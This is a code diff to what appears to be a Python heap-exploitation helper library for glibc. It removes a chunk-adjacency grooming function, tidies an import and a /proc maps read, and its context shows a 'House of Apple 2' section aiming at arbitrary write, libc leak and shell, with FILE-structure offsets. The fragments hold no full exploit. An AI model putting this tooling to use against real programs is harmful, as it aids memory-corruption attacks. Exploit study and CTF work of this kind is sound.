@@ -155,15 +155,8 @@ def groom_reclaim(req: int) -> dict:
             "result": "CONTROLLED is allocated at VICTIM's address (same size-class, LIFO)."}
 
 
-def groom_adjacent(req: int, n: int = 2) -> dict:
-    """Make `n` same-size chunks adjacent (fresh allocations bump contiguously)."""
-    return {"ops": [("alloc", f"C{i}", req) for i in range(n)],
-            "chunk_size": request2size(req),
-            "result": f"C0..C{n - 1} are adjacent, each {hex(request2size(req))} apart."}
-
-
 # --- House of Apple 2: arbitrary write + libc leak -> shell on modern glibc (>= 2.34) -----------
-import struct as _struct   # noqa: E402
+import struct as _struct  # noqa: E402
 
 # Fixed _IO_FILE / _IO_wide_data field offsets (stable across glibc; verified live on 2.35-2.43).
 _F_FLAGS, _F_WRITE_BASE, _F_WRITE_PTR = 0x00, 0x20, 0x28
@@ -318,7 +311,8 @@ def unsorted_bin_offset(libc_path=None):
                                 stdout=subprocess.PIPE, env=env)
         out = proc.stdout.read(8)                               # blocks until the leak is written
         try:
-            maps = open(f"/proc/{proc.pid}/maps").read().splitlines()  # process paused on read()
+            with open(f"/proc/{proc.pid}/maps") as _f:    # process paused on read()
+                maps = _f.read().splitlines()
         except OSError:
             maps = []
         try:
